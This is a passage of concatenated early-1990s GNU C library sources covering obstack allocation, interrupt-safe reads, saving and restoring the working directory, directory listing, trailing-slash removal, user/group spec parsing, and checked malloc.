   DEFAULT_ROUNDING.  So we prepare for it to do that.  */
union fooround {long x; double d;};
#define DEFAULT_ROUNDING (sizeof (union fooround))

/* When we copy a long block of data, this is the unit to do it with.
   On some machines, copying successive ints does not work;
   in such a case, redefine COPYING_UNIT to `long' (if that works)
   or `char' as a last resort.  */
#ifndef COPYING_UNIT
#define COPYING_UNIT int
#endif

/* The non-GNU-C macros copy the obstack into this global variable
   to avoid multiple evaluation.  */

struct obstack *_obstack;

/* Define a macro that either calls functions with the traditional malloc/free
   calling interface, or calls functions with the mmalloc/mfree interface
   (that adds an extra first argument), based on the state of use_extra_arg.
   For free, do not use ?:, since some compilers, like the MIPS compilers,
   do not allow (expr) ? void : void.  */

#define CALL_CHUNKFUN(h, size) \
  (((h) -> use_extra_arg) \
   ? (*(h)->chunkfun) ((h)->extra_arg, (size)) \
   : (*(h)->chunkfun) ((size)))

#define CALL_FREEFUN(h, old_chunk) \
  do { \
    if ((h) -> use_extra_arg) \
      (*(h)->freefun) ((h)->extra_arg, (old_chunk)); \
    else \
      (*(h)->freefun) ((old_chunk)); \
  } while (0)


/* Initialize an obstack H for use.  Specify chunk size SIZE (0 means default).
   Objects start on multiples of ALIGNMENT (0 means use default).
   CHUNKFUN is the function to use to allocate chunks,
   and FREEFUN the function to free them.

   Return nonzero if successful, zero if out of memory.
   To recover from an out of memory error,
   free up some memory, then call this again.  */

int
_obstack_begin (h, size, alignment, chunkfun, freefun)
     struct obstack *h;
     int size;
     int alignment;
     POINTER (*chunkfun) ();
     void (*freefun) ();
{
  register struct _obstack_chunk* chunk; /* points to new chunk */

  if (alignment == 0)
    alignment = DEFAULT_ALIGNMENT;
  if (size == 0)
    /* Default size is what GNU malloc can fit in a 4096-byte block.  */
    {
      /* 12 is sizeof (mhead) and 4 is EXTRA from GNU malloc.
	 Use the values for range checking, because if range checking is off,
	 the extra bytes won't be missed terribly, but if range checking is on
	 and we used a larger request, a whole extra 4096 bytes would be
	 allocated.

	 These number are irrelevant to the new GNU malloc.  I suspect it is
	 less sensitive to the size of the request.  */
      int extra = ((((12 + DEFAULT_ROUNDING - 1) & ~(DEFAULT_ROUNDING - 1))
		    + 4 + DEFAULT_ROUNDING - 1)
		   & ~(DEFAULT_ROUNDING - 1));
      size = 4096 - extra;
    }

  h->chunkfun = (struct _obstack_chunk * (*)()) chunkfun;
  h->freefun = freefun;
  h->chunk_size = size;
  h->alignment_mask = alignment - 1;
  h->use_extra_arg = 0;

  chunk = h->chunk = CALL_CHUNKFUN (h, h -> chunk_size);
  if (!chunk)
    {
      h->alloc_failed = 1;
      return 0;
    }
  h->alloc_failed = 0;
  h->next_free = h->object_base = chunk->contents;
  h->chunk_limit = chunk->limit
    = (char *) chunk + h->chunk_size;
  chunk->prev = 0;
  /* The initial chunk now contains no empty object.  */
  h->maybe_empty_object = 0;
  return 1;
}

int
_obstack_begin_1 (h, size, alignment, chunkfun, freefun, arg)
     struct obstack *h;
     int size;
     int alignment;
     POINTER (*chunkfun) ();
     void (*freefun) ();
     POINTER arg;
{
  register struct _obstack_chunk* chunk; /* points to new chunk */

  if (alignment == 0)
    alignment = DEFAULT_ALIGNMENT;
  if (size == 0)
    /* Default size is what GNU malloc can fit in a 4096-byte block.  */
    {
      /* 12 is sizeof (mhead) and 4 is EXTRA from GNU malloc.
	 Use the values for range checking, because if range checking is off,
	 the extra bytes won't be missed terribly, but if range checking is on
	 and we used a larger request, a whole extra 4096 bytes would be
	 allocated.

	 These number are irrelevant to the new GNU malloc.  I suspect it is
	 less sensitive to the size of the request.  */
      int extra = ((((12 + DEFAULT_ROUNDING - 1) & ~(DEFAULT_ROUNDING - 1))
		    + 4 + DEFAULT_ROUNDING - 1)
		   & ~(DEFAULT_ROUNDING - 1));
      size = 4096 - extra;
    }

  h->chunkfun = (struct _obstack_chunk * (*)()) chunkfun;
  h->freefun = freefun;
  h->chunk_size = size;
  h->alignment_mask = alignment - 1;
  h->extra_arg = arg;
  h->use_extra_arg = 1;

  chunk = h->chunk = CALL_CHUNKFUN (h, h -> chunk_size);
  if (!chunk)
    {
      h->alloc_failed = 1;
      return 0;
    }
  h->alloc_failed = 0;
  h->next_free = h->object_base = chunk->contents;
  h->chunk_limit = chunk->limit
    = (char *) chunk + h->chunk_size;
  chunk->prev = 0;
  /* The initial chunk now contains no empty object.  */
  h->maybe_empty_object = 0;
  return 1;
}

/* Allocate a new current chunk for the obstack *H
   on the assumption that LENGTH bytes need to be added
   to the current object, or a new object of length LENGTH allocated.
   Copies any partial object from the end of the old chunk
   to the beginning of the new one.  */

void
_obstack_newchunk (h, length)
     struct obstack *h;
     int length;
{
  register struct _obstack_chunk*	old_chunk = h->chunk;
  register struct _obstack_chunk*	new_chunk;
  register long	new_size;
  register int obj_size = h->next_free - h->object_base;
  register int i;
  int already;

  /* Compute size for new chunk.  */
  new_size = (obj_size + length) + (obj_size >> 3) + 100;
  if (new_size < h->chunk_size)
    new_size = h->chunk_size;

  /* Allocate and initialize the new chunk.  */
  new_chunk = CALL_CHUNKFUN (h, new_size);
  if (!new_chunk)
    {
      h->alloc_failed = 1;
      return;
    }
  h->alloc_failed = 0;
  h->chunk = new_chunk;
  new_chunk->prev = old_chunk;
  new_chunk->limit = h->chunk_limit = (char *) new_chunk + new_size;

  /* Move the existing object to the new chunk.
     Word at a time is fast and is safe if the object
     is sufficiently aligned.  */
  if (h->alignment_mask + 1 >= DEFAULT_ALIGNMENT)
    {
      for (i = obj_size / sizeof (COPYING_UNIT) - 1;
	   i >= 0; i--)
	((COPYING_UNIT *)new_chunk->contents)[i]
	  = ((COPYING_UNIT *)h->object_base)[i];
      /* We used to copy the odd few remaining bytes as one extra COPYING_UNIT,
	 but that can cross a page boundary on a machine
	 which does not do strict alignment for COPYING_UNITS.  */
      already = obj_size / sizeof (COPYING_UNIT) * sizeof (COPYING_UNIT);
    }
  else
    already = 0;
  /* Copy remaining bytes one by one.  */
  for (i = already; i < obj_size; i++)
    new_chunk->contents[i] = h->object_base[i];

  /* If the object just copied was the only data in OLD_CHUNK,
     free that chunk and remove it from the chain.
     But not if that chunk might contain an empty object.  */
  if (h->object_base == old_chunk->contents && ! h->maybe_empty_object)
    {
      new_chunk->prev = old_chunk->prev;
      CALL_FREEFUN (h, old_chunk);
    }

  h->object_base = new_chunk->contents;
  h->next_free = h->object_base + obj_size;
  /* The new chunk certainly contains no empty object yet.  */
  h->maybe_empty_object = 0;
}

/* Return nonzero if object OBJ has been allocated from obstack H.
   This is here for debugging.
   If you use it in a program, you are probably losing.  */

#if defined (__STDC__) && __STDC__
/* Suppress -Wmissing-prototypes warning.  We don't want to declare this in
   obstack.h because it is just for debugging.  */
int _obstack_allocated_p (struct obstack *h, POINTER obj);
#endif

int
_obstack_allocated_p (h, obj)
     struct obstack *h;
     POINTER obj;
{
  register struct _obstack_chunk*  lp;	/* below addr of any objects in this chunk */
  register struct _obstack_chunk*  plp;	/* point to previous chunk if any */

  lp = (h)->chunk;
  /* We use >= rather than > since the object cannot be exactly at
     the beginning of the chunk but might be an empty object exactly
     at the end of an adjacent chunk. */
  while (lp != 0 && ((POINTER)lp >= obj || (POINTER)(lp)->limit < obj))
    {
      plp = lp->prev;
      lp = plp;
    }
  return lp != 0;
}

/* Free objects in obstack H, including OBJ and everything allocate
   more recently than OBJ.  If OBJ is zero, free everything in H.  */

#undef obstack_free

/* This function has two names with identical definitions.
   This is the first one, called from non-ANSI code.  */

void
_obstack_free (h, obj)
     struct obstack *h;
     POINTER obj;
{
  register struct _obstack_chunk*  lp;	/* below addr of any objects in this chunk */
  register struct _obstack_chunk*  plp;	/* point to previous chunk if any */

  lp = h->chunk;
  /* We use >= because there cannot be an object at the beginning of a chunk.
     But there can be an empty object at that address
     at the end of another chunk.  */
  while (lp != 0 && ((POINTER)lp >= obj || (POINTER)(lp)->limit < obj))
    {
      plp = lp->prev;
      CALL_FREEFUN (h, lp);
      lp = plp;
      /* If we switch chunks, we can't tell whether the new current
	 chunk contains an empty object, so assume that it may.  */
      h->maybe_empty_object = 1;
    }
  if (lp)
    {
      h->object_base = h->next_free = (char *)(obj);
      h->chunk_limit = lp->limit;
      h->chunk = lp;
    }
  else if (obj != 0)
    /* obj is not in any of the chunks! */
    abort ();
}

/* This function is used from ANSI code.  */

void
obstack_free (h, obj)
     struct obstack *h;
     POINTER obj;
{
  register struct _obstack_chunk*  lp;	/* below addr of any objects in this chunk */
  register struct _obstack_chunk*  plp;	/* point to previous chunk if any */

  lp = h->chunk;
  /* We use >= because there cannot be an object at the beginning of a chunk.
     But there can be an empty object at that address
     at the end of another chunk.  */
  while (lp != 0 && ((POINTER)lp >= obj || (POINTER)(lp)->limit < obj))
    {
      plp = lp->prev;
      CALL_FREEFUN (h, lp);
      lp = plp;
      /* If we switch chunks, we can't tell whether the new current
	 chunk contains an empty object, so assume that it may.  */
      h->maybe_empty_object = 1;
    }
  if (lp)
    {
      h->object_base = h->next_free = (char *)(obj);
      h->chunk_limit = lp->limit;
      h->chunk = lp;
    }
  else if (obj != 0)
    /* obj is not in any of the chunks! */
    abort ();
}

#if 0
/* These are now turned off because the applications do not use it
   and it uses bcopy via obstack_grow, which causes trouble on sysV.  */

/* Now define the functional versions of the obstack macros.
   Define them to simply use the corresponding macros to do the job.  */

#if defined (__STDC__) && __STDC__
/* These function definitions do not work with non-ANSI preprocessors;
   they won't pass through the macro names in parentheses.  */

/* The function names appear in parentheses in order to prevent
   the macro-definitions of the names from being expanded there.  */

POINTER (obstack_base) (obstack)
     struct obstack *obstack;
{
  return obstack_base (obstack);
}

POINTER (obstack_next_free) (obstack)
     struct obstack *obstack;
{
  return obstack_next_free (obstack);
}

int (obstack_object_size) (obstack)
     struct obstack *obstack;
{
  return obstack_object_size (obstack);
}

int (obstack_room) (obstack)
     struct obstack *obstack;
{
  return obstack_room (obstack);
}

void (obstack_grow) (obstack, pointer, length)
     struct obstack *obstack;
     POINTER pointer;
     int length;
{
  obstack_grow (obstack, pointer, length);
}

void (obstack_grow0) (obstack, pointer, length)
     struct obstack *obstack;
     POINTER pointer;
     int length;
{
  obstack_grow0 (obstack, pointer, length);
}

void (obstack_1grow) (obstack, character)
     struct obstack *obstack;
     int character;
{
  obstack_1grow (obstack, character);
}

void (obstack_blank) (obstack, length)
     struct obstack *obstack;
     int length;
{
  obstack_blank (obstack, length);
}

void (obstack_1grow_fast) (obstack, character)
     struct obstack *obstack;
     int character;
{
  obstack_1grow_fast (obstack, character);
}

void (obstack_blank_fast) (obstack, length)
     struct obstack *obstack;
     int length;
{
  obstack_blank_fast (obstack, length);
}

POINTER (obstack_finish) (obstack)
     struct obstack *obstack;
{
  return obstack_finish (obstack);
}

POINTER (obstack_alloc) (obstack, length)
     struct obstack *obstack;
     int length;
{
  return obstack_alloc (obstack, length);
}

POINTER (obstack_copy) (obstack, pointer, length)
     struct obstack *obstack;
     POINTER pointer;
     int length;
{
  return obstack_copy (obstack, pointer, length);
}

POINTER (obstack_copy0) (obstack, pointer, length)
     struct obstack *obstack;
     POINTER pointer;
     int length;
{
  return obstack_copy0 (obstack, pointer, length);
}

#endif /* __STDC__ */

#endif /* 0 */

#endif	/* _LIBC or not __GNU_LIBRARY__.  */
/* safe-read.c -- an interface to read that retries after interrupts
   Copyright (C) 1993, 1994 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
   */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#include <sys/types.h>

#ifdef HAVE_UNISTD_H
#include <unistd.h>
#endif

#include <errno.h>
#ifndef errno
extern int errno;
#endif

/* Read LEN bytes at PTR from descriptor DESC, retrying if interrupted.
   Return the actual number of bytes read, zero for EOF, or negative
   for an error.  */

int
safe_read (desc, ptr, len)
     int desc;
     char *ptr;
     int len;
{
  int n_chars;

  if (len <= 0)
    return len;

#ifdef EINTR
  do
    {
      n_chars = read (desc, ptr, len);
    }
  while (n_chars < 0 && errno == EINTR);
#else
  n_chars = read (desc, ptr, len);
#endif

  return n_chars;
}
/* save-cwd.c -- Save and restore current working directory.
   Copyright (C) 1995 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

/* Written by Jim Meyering <meyering@na-net.ornl.gov>.  */

#ifdef HAVE_CONFIG_H
# include "config.h"
#endif

#include <stdio.h>

#ifdef STDC_HEADERS
# include <stdlib.h>
#endif

#ifdef HAVE_UNISTD_H
# include <unistd.h>
#endif

#ifdef HAVE_FCNTL_H
# include <fcntl.h>
#else
# include <sys/file.h>
#endif

#include <errno.h>
# ifndef errno
extern int errno;
#endif

#include "save-cwd.h"
#include "error.h"

char *xgetcwd __P((void));

/* Record the location of the current working directory in CWD so that
   the program may change to other directories and later use restore_cwd
   to return to the recorded location.  This function may allocate
   space using malloc (via xgetcwd) or leave a file descriptor open;
   use free_cwd to perform the necessary free or close.  Upon failure,
   no memory is allocated, any locally opened file descriptors are
   closed;  return non-zero -- in that case, free_cwd need not be
   called, but doing so is ok.  Otherwise, return zero.  */

int
save_cwd (cwd)
     struct saved_cwd *cwd;
{
  static int have_working_fchdir = 1;

  cwd->desc = -1;
  cwd->name = NULL;

  if (have_working_fchdir)
    {
#ifdef HAVE_FCHDIR
      cwd->desc = open (".", O_RDONLY);
      if (cwd->desc < 0)
	{
	  error (0, errno, "cannot open current directory");
	  return 1;
	}

# if __sun__ || sun
      /* On SunOS 4, fchdir returns EINVAL if accounting is enabled,
	 so we have to fall back to chdir.  */
      if (fchdir (cwd->desc))
	{
	  if (errno == EINVAL)
	    {
	      close (cwd->desc);
	      cwd->desc = -1;
	      have_working_fchdir = 0;
	    }
	  else
	    {
	      error (0, errno, "current directory");
	      close (cwd->desc);
	      cwd->desc = -1;
	      return 1;
	    }
	}
# endif /* __sun__ || sun */
#else
#define fchdir(x) (abort (), 0)
      have_working_fchdir = 0;
#endif
    }

  if (!have_working_fchdir)
    {
      cwd->name = xgetcwd ();
      if (cwd->name == NULL)
	{
	  error (0, errno, "cannot get current directory");
	  return 1;
	}
    }
  return 0;
}

/* Change to recorded location, CWD, in directory hierarchy.
   If "saved working directory", NULL))
   */

int
restore_cwd (cwd, dest, from)
     const struct saved_cwd *cwd;
     const char *dest;
     const char *from;
{
  int fail = 0;
  if (cwd->desc >= 0)
    {
      if (fchdir (cwd->desc))
	{
	  error (0, errno, "cannot return to %s%s%s",
		 (dest ? dest : "saved working directory"),
		 (from ? " from " : ""),
		 (from ? from : ""));
	  fail = 1;
	}
    }
  else if (chdir (cwd->name) < 0)
    {
      error (0, errno, "%s", cwd->name);
      fail = 1;
    }
  return fail;
}

void
free_cwd (cwd)
     struct saved_cwd *cwd;
{
  if (cwd->desc >= 0)
    close (cwd->desc);
  if (cwd->name)
    free (cwd->name);
}

/* savedir.c -- save the list of files in a directory in a string
   Copyright (C) 1990 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

/* Written by David MacKenzie <djm@gnu.ai.mit.edu>. */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#include <sys/types.h>

#ifdef HAVE_UNISTD_H
#include <unistd.h>
#endif

#if HAVE_DIRENT_H
# include <dirent.h>
# define NAMLEN(dirent) strlen((dirent)->d_name)
#else
# define dirent direct
# define NAMLEN(dirent) (dirent)->d_namlen
# if HAVE_SYS_NDIR_H
#  include <sys/ndir.h>
# endif
# if HAVE_SYS_DIR_H
#  include <sys/dir.h>
# endif
# if HAVE_NDIR_H
#  include <ndir.h>
# endif
#endif

#ifdef CLOSEDIR_VOID
/* Fake a return value. */
#define CLOSEDIR(d) (closedir (d), 0)
#else
#define CLOSEDIR(d) closedir (d)
#endif

#ifdef STDC_HEADERS
#include <stdlib.h>
#include <string.h>
#else
char *malloc ();
char *realloc ();
#endif
#ifndef NULL
#define NULL 0
#endif

char *stpcpy ();

/* Return a freshly allocated string containing the filenames
   in directory DIR, separated by '\0' characters;
   the end is marked by two '\0' characters in a row.
   NAME_SIZE is the number of bytes to initially allocate
   for the string; it will be enlarged as needed.
   Return NULL if DIR cannot be opened or if out of memory. */

char *
savedir (dir, name_size)
     char *dir;
     unsigned name_size;
{
  DIR *dirp;
  struct dirent *dp;
  char *name_space;
  char *namep;

  dirp = opendir (dir);
  if (dirp == NULL)
    return NULL;

  name_space = (char *) malloc (name_size);
  if (name_space == NULL)
    {
      closedir (dirp);
      return NULL;
    }
  namep = name_space;

  while ((dp = readdir (dirp)) != NULL)
    {
      /* Skip "." and ".." (some NFS filesystems' directories lack them). */
      if (dp->d_name[0] != '.'
	  || (dp->d_name[1] != '\0'
	      && (dp->d_name[1] != '.' || dp->d_name[2] != '\0')))
	{
	  unsigned size_needed = (namep - name_space) + NAMLEN (dp) + 2;

	  if (size_needed > name_size)
	    {
	      char *new_name_space;

	      while (size_needed > name_size)
		name_size += 1024;

	      new_name_space = realloc (name_space, name_size);
	      if (new_name_space == NULL)
		{
		  closedir (dirp);
		  return NULL;
		}
	      namep += new_name_space - name_space;
	      name_space = new_name_space;
	    }
	  namep = stpcpy (namep, dp->d_name) + 1;
	}
    }
  *namep = '\0';
  if (CLOSEDIR (dirp))
    {
      free (name_space);
      return NULL;
    }
  return name_space;
}
/* stripslash.c -- remove trailing slashes from a string
   Copyright (C) 1990 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#if defined(STDC_HEADERS) || defined(HAVE_STRING_H)
#include <string.h>
#else
#include <strings.h>
#endif

/* Remove trailing slashes from PATH.
   This is useful when using filename completion from a shell that
   adds a "/" after directory names (such as tcsh and bash), because
   the Unix rename and rmdir system calls return an "Invalid argument" error
   when given a path that ends in "/" (except for the root directory).  */

void
strip_trailing_slashes (path)
     char *path;
{
  int last;

  last = strlen (path) - 1;
  while (last > 0 && path[last] == '/')
    path[last--] = '\0';
}
/* userspec.c -- Parse a user and group string.
   Copyright (C) 1989, 1990, 1991, 1992 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

/* Written by David MacKenzie <djm@gnu.ai.mit.edu>.  */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#ifdef __GNUC__
# define alloca __builtin_alloca
#else
# ifdef HAVE_ALLOCA_H
#  include <alloca.h>
# else
#  ifdef _AIX
 #pragma alloca
#  else
char *alloca ();
#  endif
# endif
#endif

#include <stdio.h>
#include <sys/types.h>
#include <pwd.h>
#include <grp.h>

#ifdef HAVE_STRING_H
# include <string.h>
#else
# include <strings.h>
# ifndef strchr
#  define strchr index
# endif
#endif

#ifdef STDC_HEADERS
# include <stdlib.h>
#endif

#ifdef HAVE_UNISTD_H
# include <unistd.h>
#endif

#ifndef _POSIX_VERSION
struct passwd *getpwnam ();
struct group *getgrnam ();
struct group *getgrgid ();
#endif

#ifndef HAVE_ENDGRENT
# define endgrent() ((void) 0)
#endif

#ifndef HAVE_ENDPWENT
# define endpwent() ((void) 0)
#endif

/* Perform the equivalent of the statement `dest = strdup (src);',
   but obtaining storage via alloca instead of from the heap.  */

#define V_STRDUP(dest, src)						\
  do									\
    {									\
      int _len = strlen ((src));					\
      (dest) = (char *) alloca (_len + 1);				\
      strcpy (dest, src);						\
    }									\
  while (0)

#define isdigit(c) ((c) >= '0' && (c) <= '9')

char *strdup ();

/* Return nonzero if STR represents an unsigned decimal integer,
   otherwise return 0. */

static int
is_number (str)
     const char *str;
{
  for (; *str; str++)
    if (!isdigit (*str))
      return 0;
  return 1;
}

/* Extract from NAME, which has the form "[user][:.][group]",
   a USERNAME, UID U, GROUPNAME, and GID G.
   Either user or group, or both, must be present.
   If the group is omitted but the ":" or "." separator is given,
   use the given user's login group.

   USERNAME and GROUPNAME will be in newly malloc'd memory.
   Either one might be NULL instead, indicating that it was not
   given and the corresponding numeric ID was left unchanged.

   Return NULL if successful, a static error message string if not.  */

const char *
parse_user_spec (spec_arg, uid, gid, username_arg, groupname_arg)
     const char *spec_arg;
     uid_t *uid;
     gid_t *gid;
     char **username_arg, **groupname_arg;
{
  static const char *tired = "virtual memory exhausted";
  const char *error_msg;
  char *spec;			/* A copy we can write on.  */
  struct passwd *pwd;
  struct group *grp;
  char *g, *u, *separator;
  char *groupname;

  error_msg = NULL;
  *username_arg = *groupname_arg = NULL;
  groupname = NULL;

  V_STRDUP (spec, spec_arg);

  /* Find the separator if there is one.  */
  separator = strchr (spec, ':');
  if (separator == NULL)
    separator = strchr (spec, '.');

  /* Replace separator with a NUL.  */
  if (separator != NULL)
    *separator = '\0';

  /* Set U and G to non-zero length strings corresponding to user and
     group specifiers or to NULL.  */
  u = (*spec == '\0' ? NULL : spec);

  g = (separator == NULL || *(separator + 1) == '\0'
       ? NULL
       : separator + 1);

  if (u == NULL && g == NULL)
    return "can not omit both user and group";

  if (u != NULL)
    {
      pwd = getpwnam (u);
      if (pwd == NULL)
	{

	  if (!is_number (u))
	    error_msg = "invalid user";
	  else
	    {
	      int use_login_group;
	      use_login_group = (separator != NULL && g == NULL);
	      if (use_login_group)
		error_msg = "cannot get the login group of a numeric UID";
	      else
		*uid = atoi (u);
	    }
	}
      else
	{
	  *uid = pwd->pw_uid;
	  if (g == NULL && separator != NULL)
	    {
	      /* A separator was given, but a group was not specified,
	         so get the login group.  */
	      *gid = pwd->pw_gid;
	      grp = getgrgid (pwd->pw_gid);
	      if (grp == NULL)
		{
		  /* This is enough room to hold the unsigned decimal
		     representation of any 32-bit quantity and the trailing
		     zero byte.  */
		  char uint_buf[21];
		  sprintf (uint_buf, "%u", (unsigned) (pwd->pw_gid));
		  V_STRDUP (groupname, uint_buf);
		}
	      else
		{
		  V_STRDUP (groupname, grp->gr_name);
		}
	      endgrent ();
	    }
	}
      endpwent ();
    }

  if (g != NULL && error_msg == NULL)
    {
      /* Explicit group.  */
      grp = getgrnam (g);
      if (grp == NULL)
	{
	  if (!is_number (g))
	    error_msg = "invalid group";
	  else
	    *gid = atoi (g);
	}
      else
	*gid = grp->gr_gid;
      endgrent ();		/* Save a file descriptor.  */

      if (error_msg == NULL)
	V_STRDUP (groupname, g);
    }

  if (error_msg == NULL)
    {
      if (u != NULL)
	{
	  *username_arg = strdup (u);
	  if (*username_arg == NULL)
	    error_msg = tired;
	}

      if (groupname != NULL && error_msg == NULL)
	{
	  *groupname_arg = strdup (groupname);
	  if (*groupname_arg == NULL)
	    {
	      if (*username_arg != NULL)
		{
		  free (*username_arg);
		  *username_arg = NULL;
		}
	      error_msg = tired;
	    }
	}
    }

  return error_msg;
}

#ifdef TEST

#define NULL_CHECK(s) ((s) == NULL ? "(null)" : (s))

int
main (int argc, char **argv)
{
  int i;

  for (i = 1; i < argc; i++)
    {
      const char *e;
      char *username, *groupname;
      uid_t uid;
      gid_t gid;
      char *tmp;

      tmp = strdup (argv[i]);
      e = parse_user_spec (tmp, &uid, &gid, &username, &groupname);
      free (tmp);
      printf ("%s: %u %u %s %s %s\n",
	      argv[i],
	      (unsigned int) uid,
	      (unsigned int) gid,
	      NULL_CHECK (username),
	      NULL_CHECK (groupname),
	      NULL_CHECK (e));
    }

  exit (0);
}

#endif
/* xgetcwd.c -- return current directory with unlimited length
   Copyright (C) 1992 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

/* Written by David MacKenzie <djm@gnu.ai.mit.edu>.  */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#include <stdio.h>
#include <errno.h>
#ifndef errno
extern int errno;
#endif
#include <sys/types.h>
#include "pathmax.h"

#ifndef HAVE_GETCWD
char *getwd ();
#define getcwd(buf, max) getwd (buf)
#else
char *getcwd ();
#endif

/* Amount to increase buffer size by in each try. */
#define PATH_INCR 32

char *xmalloc ();
char *xrealloc ();
void free ();

/* Return the current directory, newly allocated, arbitrarily long.
   Return NULL and set errno on error. */

char *
xgetcwd ()
{
  char *cwd;
  char *ret;
  unsigned path_max;

  errno = 0;
  path_max = (unsigned) PATH_MAX;
  path_max += 2;		/* The getcwd docs say to do this. */

  cwd = xmalloc (path_max);

  errno = 0;
  while ((ret = getcwd (cwd, path_max)) == NULL && errno == ERANGE)
    {
      path_max += PATH_INCR;
      cwd = xrealloc (cwd, path_max);
      errno = 0;
    }

  if (ret == NULL)
    {
      int save_errno = errno;
      free (cwd);
      errno = save_errno;
      return NULL;
    }
  return cwd;
}
/* xmalloc.c -- malloc with out of memory checking
   Copyright (C) 1990, 91, 92, 93, 94 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#if __STDC__
#define VOID void
#else
#define VOID char
#endif

#include <sys/types.h>

#if STDC_HEADERS
#include <stdlib.h>
#else
VOID *malloc ();
VOID *realloc ();
void free ();
#endif

/* This is for other GNU distributions with internationalized messages.
   The GNU C Library itself does not yet support such messages.  */
#if HAVE_LIBINTL_H
# include <libintl.h>
#else
# define gettext(msgid) (msgid)
#endif

#ifndef EXIT_FAILURE
#define EXIT_FAILURE 1
#endif

/* Exit value when the requested amount of memory is not available.
   The caller may set it to some other value.  */
int xmalloc_exit_failure = EXIT_FAILURE;

#if __STDC__ && (HAVE_VPRINTF || HAVE_DOPRNT)
void error (int, int, const char *, ...);
#else
void error ();
#endif

static VOID *
fixup_null_alloc (n)
     size_t n;
{
  VOID *p;

  p = 0;
  if (n == 0)
    p = malloc ((size_t) 1);
  if (p == 0)
    error (xmalloc_exit_failure, 0, gettext ("Memory exhausted"));
  return p;
}

/* Allocate N bytes of memory dynamically, with error checking.  */

VOID *
xmalloc (n)
     size_t n;
{
  VOID *p;

  p = malloc (n);
  if (p == 0)
    p = fixup_null_alloc (n);
  return p;
}

/* Change the size of an allocated block of memory P to N bytes,
   with error checking.
   If P is NULL, run xmalloc.  */

VOID *
xrealloc (p, n)
     VOID *p;
     size_t n;
{
  if (p == 0)
    return xmalloc (n);
  p = realloc (p, n);
  if (p == 0)
    p = fixup_null_alloc (n);
  return p;
}
/* xstrdup.c -- copy a string with out of memory checking
   Copyright (C) 1990 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#if defined(STDC_HEADERS) || defined(HAVE_STRING_H)
#include <string.h>
#else
#include <strings.h>
#endif
char *xmalloc ();

/* Return a newly allocated copy of STRING.  */

char *
xstrdup (string)
     char *string;
{
